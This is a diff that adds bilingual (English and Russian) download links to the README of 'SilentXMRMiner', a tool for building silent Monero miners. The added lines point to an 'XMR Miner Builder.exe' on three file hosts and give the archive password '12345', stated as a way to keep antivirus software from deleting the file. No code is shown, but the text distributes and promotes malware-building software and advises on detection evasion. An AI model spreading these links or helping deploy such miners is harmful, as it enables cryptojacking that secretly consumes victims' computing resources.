@@ -1,3 +1,13 @@
+Links to the builder for creating a miner (the password for XMR Miner Builder.exe is 12345 (so that the antivirus does not delete it)):
+https://oxy.st/d/hnng
+https://disk.yandex.ru/d/V1tcI47s3zMv3Q
+https://drive.google.com/file/d/1DuCHFQdszZqCfP6Vx5bGO7bpsm7VA8hA/view?usp=sharing
+
+Ссылки на билдер для создания майнера (пароль на XMR Miner Builder.exe - 12345(чтобы антивирус не удалил его)):
+https://oxy.st/d/hnng
+https://disk.yandex.ru/d/V1tcI47s3zMv3Q
+https://drive.google.com/file/d/1DuCHFQdszZqCfP6Vx5bGO7bpsm7VA8hA/view?usp=sharing
+
 SilentXMRMiner v1.2.3 — Based on Lime Miner v0.3
 .NET — Coded in Visual Basic .NET, requires .NET Framework 4.5.
 Codedom — No need for external libraries to compile
